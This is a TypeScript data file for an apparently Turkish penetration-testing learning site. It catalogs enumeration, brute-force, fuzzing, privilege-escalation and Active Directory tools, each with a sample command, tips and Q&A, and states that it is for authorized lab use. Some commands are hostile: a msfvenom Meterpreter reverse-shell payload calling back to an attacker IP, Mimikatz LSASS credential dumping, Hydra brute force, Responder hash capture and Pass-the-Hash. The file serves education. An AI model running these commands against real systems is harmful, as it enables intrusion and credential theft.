// Araç Cephaneliği — /araclar sayfasında kullanılır.
// Her araç: isim + kısa açıklama + 1 pratik komut. Her kategori sonunda soru-cevap.
// ETİK: Tüm araçlar yalnızca yetkili sızma testleri ve izole lab ortamları içindir.

export interface ArsenalTool {
  name: string;
  desc: string;
  cmd: string;
  tip?: string;
}
export interface ArsenalQA { q: string; a: string; }
export interface ArsenalCategory {
  slug: string;
  title: string;
  icon: string;
  color: string; // tailwind renk adı
  tools: ArsenalTool[];
  questions: ArsenalQA[];
}

export const arsenal: ArsenalCategory[] = [
  {
    slug: "enumeration",
    title: "Bilgi Toplama ve Keşif (Enumeration)",
    icon: "🔍",
    color: "emerald",
    tools: [
      {
        name: "enum4linux",
        desc: "Windows ve Samba sistemlerinden kullanıcı, paylaşım ve politika bilgilerini toplar.",
        cmd: "enum4linux -a 10.10.10.1",
        tip: "-a tüm temel enumeration'ı (kullanıcı, grup, paylaşım, parola politikası) çalıştırır.",
      },
      {
        name: "Nikto",
        desc: "Web sunucularındaki potansiyel zafiyetleri, eski sürüm yazılımları ve yanlış yapılandırmaları tarar.",
        cmd: "nikto -h http://10.10.10.1",
        tip: "Gürültülüdür — IDS/WAF tarafından kolayca tespit edilir, lab/izinli testte kullan.",
      },
      {
        name: "WPScan",
        desc: "WordPress tabanlı sitelerde eklenti, tema ve kullanıcı zafiyetlerini tespit eder.",
        cmd: "wpscan --url https://hedef.com --enumerate u,vp",
        tip: "u=kullanıcılar, vp=zafiyetli eklentiler. Zafiyet verisi için --api-token gerekir.",
      },
    ],
    questions: [
      { q: "enum4linux hangi protokoller üzerinden bilgi toplar ve hangi portları hedefler?", a: "SMB/Samba (139/445) ve RPC üzerinden çalışır; arka planda smbclient, rpcclient, nmblookup gibi araçları kullanarak kullanıcı, grup, paylaşım ve parola politikası bilgisini toplar." },
      { q: "Nikto taraması neden 'gürültülü' kabul edilir?", a: "Binlerce bilinen zafiyet/dosya yolunu sırayla dener; bu yoğun istek trafiği sunucu loglarında ve IDS/WAF sistemlerinde kolayca fark edilir. Gizli (stealth) bir araç değildir." },
      { q: "WPScan ile zafiyetli eklenti verisini görmek için ne gerekir?", a: "WPScan Vulnerability Database API token'ı (wpscan.com'dan ücretsiz alınır). Token olmadan eklenti/tema listelenir ama bilinen CVE eşleştirmeleri gösterilmez." },
    ],
  },
  {
    slug: "bruteforce",
    title: "Parola Kırma ve Kaba Kuvvet (Brute Force)",
    icon: "🔑",
    color: "red",
    tools: [
      {
        name: "Hydra",
        desc: "Çevrimiçi (online) brute force saldırıları için kullanılır; SSH, FTP, HTTP, SMB gibi protokolleri destekler.",
        cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1",
        tip: "-l tek kullanıcı, -L kullanıcı listesi; -P parola listesi. Online olduğu için yavaş ve gürültülüdür.",
      },
      {
        name: "John the Ripper",
        desc: "Çevrimdışı (offline) parola kırma ve hash analizinde sektör standartlarındandır.",
        cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        tip: "Kırılanları görmek için: john --show hash.txt. Tür belirtmek hızlandırır: --format=...",
      },
      {
        name: "Hashcat",
        desc: "Ekran kartı (GPU) gücünü kullanarak çok hızlı hash kırma işlemleri yapar.",
        cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
        tip: "-m hash türü (0=MD5, 1000=NTLM, 1800=sha512crypt), -a 0 sözlük saldırısı.",
      },
    ],
    questions: [
      { q: "Online ve offline parola kırma arasındaki temel fark nedir?", a: "Online (Hydra) çalışan bir servise canlı deneme yapar — yavaş, gürültülü ve hesap kilitlenmesine takılabilir. Offline (John/Hashcat) ele geçirilmiş hash dosyası üzerinde çalışır — çok daha hızlıdır ve hedefe trafik üretmez." },
      { q: "Neden Hashcat genelde John'dan daha hızlıdır?", a: "Hashcat GPU (ekran kartı) üzerinde binlerce paralel çekirdek kullanır; John varsayılan olarak CPU ağırlıklıdır. GPU, hash hesaplamalarını kat kat hızlandırır." },
      { q: "Bir brute force saldırısına karşı en etkili savunmalar nelerdir?", a: "Hesap kilitleme (başarısız deneme limiti), MFA, güçlü parola politikası, rate limiting, ve hash'leri yavaş+salt'lı algoritmalarla (bcrypt/argon2) saklamak." },
    ],
  },
  {
    slug: "fuzzing",
    title: "Dizin ve Dosya Taraması (Fuzzing)",
    icon: "📁",
    color: "amber",
    tools: [
      {
        name: "DirBuster",
        desc: "Web sunucularında gizli dizin ve dosyaları kelime listeleriyle (wordlist) bulan grafik arayüzlü araçtır.",
        cmd: "dirbuster -H -u http://10.10.10.1/ -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        tip: "-H başsız (headless) mod. Genelde GUI ile kullanılır; konsol için Gobuster/ffuf tercih edilir.",
      },
      {
        name: "Gobuster",
        desc: "DirBuster'ın konsol tabanlı, Go diliyle yazılmış çok daha hızlı alternatifidir.",
        cmd: "gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50",
        tip: "-t 50 paralel iş parçacığı sayısı. dns ve vhost modları da vardır.",
      },
      {
        name: "ffuf",
        desc: "Son derece hızlı, esnek ve özelleştirilebilir bir web fuzzer aracıdır.",
        cmd: "ffuf -u http://10.10.10.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
        tip: "FUZZ kelimesi nereye yazılırsa orası fuzzlanır (parametre, başlık, vhost). -fc 404 ile filtrele.",
      },
    ],
    questions: [
      { q: "Gobuster, DirBuster'a göre neden tercih edilir?", a: "Go diliyle yazıldığı için çok daha hızlı ve hafiftir, konsoldan çalışır (GUI gerektirmez), betiklenebilir ve düşük kaynak tüketir. DirBuster Java tabanlı ve GUI ağırlıklıdır." },
      { q: "ffuf'taki 'FUZZ' anahtar kelimesi ne işe yarar?", a: "İsteğin neresine yazılırsa orayı fuzzlama (deneme) noktası yapar — dizin (/FUZZ), parametre (?id=FUZZ), HTTP başlığı veya vhost. Bu esneklik ffuf'u çok yönlü kılar." },
      { q: "Dizin taramasında 'wordlist' seçimi neden kritiktir?", a: "Bulunabilecek dizin/dosyalar yalnızca listede varsa keşfedilir. Hedefe (teknoloji, dil, uygulama) uygun liste seçmek başarı oranını doğrudan etkiler; SecLists yaygın bir kaynaktır." },
    ],
  },
  {
    slug: "privesc",
    title: "Yetki Yükseltme ve Sömürü (Privilege Escalation)",
    icon: "⬆️",
    color: "purple",
    tools: [
      {
        name: "LinPEAS / WinPEAS",
        desc: "Linux ve Windows sistemlerinde yetki yükseltme vektörlerini otomatik tarayan scriptlerdir.",
        cmd: "./linpeas.sh | tee linpeas_sonuc.txt",
        tip: "Çıktıda kırmızı/sarı vurgulananlara odaklan. WinPEAS: winpeas.exe (veya .bat).",
      },
      {
        name: "Metasploit Framework",
        desc: "Exploit test etme, çalıştırma ve payload oluşturma için kapsamlı sızma testi platformudur.",
        cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe",
        tip: "msfvenom payload üretir; dinleyici için msfconsole'da exploit/multi/handler kullanılır.",
      },
      {
        name: "Mimikatz",
        desc: "Windows bellek (LSASS) üzerinden düz metin parola, hash ve bilet bilgilerini çıkarır.",
        cmd: "privilege::debug\nsekurlsa::logonpasswords",
        tip: "Önce privilege::debug, sonra sekurlsa::logonpasswords. Admin/SYSTEM yetkisi gerekir.",
      },
    ],
    questions: [
      { q: "LinPEAS/WinPEAS gibi otomatik araçların avantaj ve riski nedir?", a: "Avantaj: yetki yükseltme vektörlerini (SUID, zayıf izinler, zamanlanmış görevler, kayıtlı kimlik bilgileri) hızla listeler. Risk: çok gürültülüdür, EDR/AV tarafından kolayca yakalanır ve sistemde iz bırakır." },
      { q: "msfvenom ile msfconsole arasındaki ilişki nedir?", a: "msfvenom payload (örn. reverse shell exe) üretir; msfconsole ise exploit'leri çalıştıran ve üretilen payload'a gelen bağlantıyı yakalayan (multi/handler) konsoldur. İkisi birlikte kullanılır." },
      { q: "Mimikatz'ın çalışması için neden yüksek yetki gerekir?", a: "Parola ve hash'leri LSASS sürecinin belleğinden okur; bu belleğe erişim için yerel yönetici veya SYSTEM yetkisi ile SeDebugPrivilege gerekir. Credential Guard ve LSASS koruması bunu zorlaştırır." },
    ],
  },
  {
    slug: "active-directory",
    title: "Active Directory ve İç Ağ Taraması",
    icon: "🏢",
    color: "sky",
    tools: [
      {
        name: "BloodHound",
        desc: "Active Directory ortamlarındaki karmaşık ilişkileri ve yetki yükseltme yollarını grafiksel olarak haritalandırır.",
        cmd: "bloodhound-python -d domain.local -u kullanici -p 'Parola1' -c All -ns 10.10.10.1",
        tip: "Toplanan veri BloodHound GUI'ye yüklenir; 'Shortest Path to Domain Admins' sorgusu en değerlisidir.",
      },
      {
        name: "Responder",
        desc: "Yerel ağda LLMNR, NBT-NS ve mDNS zehirlenmesi yaparak kullanıcı hash'lerini yakalar.",
        cmd: "sudo responder -I eth0 -dwv",
        tip: "Yakalanan NetNTLMv2 hash'leri Hashcat (-m 5600) ile kırılabilir veya relay edilebilir.",
      },
      {
        name: "NetExec (CrackMapExec)",
        desc: "İç ağlarda numaralandırma ve yanal hareket (lateral movement) için İsviçre çakısı görevi görür.",
        cmd: "netexec smb 10.10.10.0/24 -u kullanici -p 'Parola1' --shares",
        tip: "Parola yerine -H ile hash kullanılarak Pass-the-Hash yapılabilir. CrackMapExec'in devamıdır.",
      },
    ],
    questions: [
      { q: "BloodHound saldırganlara nasıl bir avantaj sağlar?", a: "AD'deki kullanıcı, grup, oturum ve yetki ilişkilerini graf olarak gösterir; 'şu kullanıcıdan Domain Admin'e en kısa yol' gibi karmaşık saldırı yollarını saniyeler içinde ortaya çıkarır. Savunmacılar da aynı analizi proaktif kapatma için kullanır." },
      { q: "Responder LLMNR/NBT-NS zehirlenmesini nasıl yapar ve savunması nedir?", a: "Bir cihaz çözemediği bir ismi LLMNR/NBT-NS ile yayınlarken, Responder sahte 'ben oyum' yanıtı verip kurbanın kimlik doğrulama hash'ini yakalar. Savunma: LLMNR ve NBT-NS protokollerini GPO ile devre dışı bırakmak." },
      { q: "NetExec/CrackMapExec ile Pass-the-Hash nasıl yapılır?", a: "Parola yerine ele geçirilmiş NTLM hash'i -H bayrağıyla verilir (örn: netexec smb HEDEF -u user -H <hash>). Böylece parolayı bilmeden, hash ile kimlik doğrulanarak yanal hareket sağlanır." },
    ],
  },
];
